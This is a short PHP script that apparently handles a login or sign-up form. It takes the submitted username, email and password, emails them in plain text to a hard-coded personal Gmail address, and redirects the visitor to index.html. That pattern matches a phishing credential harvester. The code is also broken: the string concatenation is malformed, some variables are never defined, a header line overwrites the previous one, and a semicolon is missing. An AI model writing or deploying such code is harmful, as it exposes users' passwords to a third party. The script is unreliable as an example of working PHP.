

<?php
$Username = $_POST['name'];
$vistor_email = $_POST['email'];
$password = $_POST['password'];


$email_from = 'fiyinfholuwa@gmail.com';
$email_subject = "new form submission";
$email_body = "Username: $name.\n"
				"email: $vistor_email.\n"
					"password: $message.\n.";
$to = "fiyinfholuwa@gmail.com";
$headers = "From: $email_from \r\n";
$headers = "Reply-to: $vistor_email \r\n";
mail($to, $email_subject,$email_body,$headers);
header("location: index.html")
?>